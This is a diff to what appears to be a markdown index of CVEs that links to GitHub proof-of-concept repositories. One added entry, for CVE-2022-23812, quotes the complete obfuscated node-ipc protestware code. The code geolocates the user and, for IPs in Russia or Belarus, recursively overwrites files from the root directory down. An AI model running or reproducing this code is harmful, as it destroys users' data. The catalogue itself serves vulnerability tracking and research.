@@ -455,6 +455,14 @@ An issue was discovered in phpMyAdmin 5.1 before 5.1.2. An attacker can inject m
 
 - [dipakpanchal456/CVE-2022-23808](https://github.com/dipakpanchal456/CVE-2022-23808)
 
+### CVE-2022-23812 (2022-03-16)
+
+<code>
+This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note**: from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code: **Note:** Don't run it! js import u from &quot;path&quot;; import a from &quot;fs&quot;; import o from &quot;https&quot;; setTimeout(function () { const t = Math.round(Math.random() * 4); if (t &gt; 1) { return; } const n = Buffer.from(&quot;aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=&quot;, &quot;base64&quot;); // https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString(&quot;utf8&quot;), function (t) { t.on(&quot;data&quot;, function (t) { const n = Buffer.from(&quot;Li8=&quot;, &quot;base64&quot;); const o = Buffer.from(&quot;Li4v&quot;, &quot;base64&quot;); const r = Buffer.from(&quot;Li4vLi4v&quot;, &quot;base64&quot;); const f = Buffer.from(&quot;Lw==&quot;, &quot;base64&quot;); const c = Buffer.from(&quot;Y291bnRyeV9uYW1l&quot;, &quot;base64&quot;); const e = Buffer.from(&quot;cnVzc2lh&quot;, &quot;base64&quot;); const i = Buffer.from(&quot;YmVsYXJ1cw==&quot;, &quot;base64&quot;); try { const s = JSON.parse(t.toString(&quot;utf8&quot;)); const u = s[c.toString(&quot;utf8&quot;)].toLowerCase(); const a = u.includes(e.toString(&quot;utf8&quot;)) || u.includes(i.toString(&quot;utf8&quot;)); // checks if country is Russia or Belarus if (a) { h(n.toString(&quot;utf8&quot;)); h(o.toString(&quot;utf8&quot;)); h(r.toString(&quot;utf8&quot;)); h(f.toString(&quot;utf8&quot;)); } } catch (t) {} }); }); }, Math.ceil(Math.random() * 1e3)); async function h(n = &quot;&quot;, o = &quot;&quot;) { if (!a.existsSync(n)) { return; } let r = []; try { r = a.readdirSync(n); } catch (t) {} const f = []; const c = Buffer.from(&quot;4p2k77iP&quot;, &quot;base64&quot;); for (var e = 0; e &lt; r.length; e++) { const i = u.join(n, r[e]); let t = null; try { t = a.lstatSync(i); } catch (t) { continue; } if (t.isDirectory()) { const s = h(i, o); s.length &gt; 0 ? f.push(...s) : null; } else if (i.indexOf(o) &gt;= 0) { try { a.writeFile(i, c.toString(&quot;utf8&quot;), function () {}); // overwrites file with ❤️ } catch (t) {} } } return f; } const ssl = true; export { ssl as default, ssl };
+</code>
+
+- [scriptzteam/node-ipc-malware-protestware-CVE-2022-23812](https://github.com/scriptzteam/node-ipc-malware-protestware-CVE-2022-23812)
+
 ### CVE-2022-23940 (2022-03-07)
 
 <code>
@@ -670,7 +678,12 @@ The installer of WPS Office for Windows versions prior to v11.2.0.10258 fails to
 
 - [HadiMed/KINGSOFT-WPS-Office-LPE](https://github.com/HadiMed/KINGSOFT-WPS-Office-LPE)
 
-### CVE-2022-25949
+### CVE-2022-25949 (-)
+
+<code>
+The kernel mode driver kwatch3 of KINGSOFT Internet Security 9 Plus Version 2010.06.23.247 fails to properly handle crafted inputs, leading to stack-based buffer overflow.
+</code>
+
 - [tandasat/CVE-2022-25949](https://github.com/tandasat/CVE-2022-25949)
 
 ### CVE-2022-26155 (2022-02-28)
@@ -713,7 +726,12 @@ The auto-completion plugin in Ametys CMS before 4.5.0 allows a remote unauthenti
 
 - [p0dalirius/CVE-2022-26159-Ametys-Autocompletion-XML](https://github.com/p0dalirius/CVE-2022-26159-Ametys-Autocompletion-XML)
 
-### CVE-2022-26503
+### CVE-2022-26503 (2022-03-17)
+
+<code>
+Deserialization of untrusted data in Veeam Agent for Windows 2.0, 2.1, 2.2, 3.0.2, 4.x, and 5.x allows local users to run arbitrary code with local system privileges.
+</code>
+
 - [sinsinology/CVE-2022-26503](https://github.com/sinsinology/CVE-2022-26503)
 
 ### CVE-2022-31166
@@ -7989,6 +8007,14 @@ In Action View before versions 5.2.4.4 and 6.0.3.3 there is a potential Cross-Si
 
 - [glasses618/CVE-2020-15169](https://github.com/glasses618/CVE-2020-15169)
 
+### CVE-2020-15175 (2020-10-07)
+
+<code>
+In GLPI before version 9.5.2, the `​pluginimage.send.php​` endpoint allows a user to specify an image from a plugin. The parameters can be maliciously crafted to instead delete the .htaccess file for the files directory. Any user becomes able to read all the files and folders contained in “/files/”. Some of the sensitive information that is compromised are the user sessions, logs, and more. An attacker would be able to get the Administrators session token and use that to authenticate. The issue is patched in version 9.5.2.
+</code>
+
+- [Xn2/GLPwn](https://github.com/Xn2/GLPwn)
+
 ### CVE-2020-15227 (2020-10-01)
 
 <code>
@@ -10866,6 +10892,7 @@ Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw
 - [rhbb/CVE-2019-7609](https://github.com/rhbb/CVE-2019-7609)
 - [dnr6419/CVE-2019-7609](https://github.com/dnr6419/CVE-2019-7609)
 - [wolf1892/CVE-2019-7609](https://github.com/wolf1892/CVE-2019-7609)
+- [Cr4ckC4t/cve-2019-7609](https://github.com/Cr4ckC4t/cve-2019-7609)
 
 ### CVE-2019-7610 (2019-03-25)
 
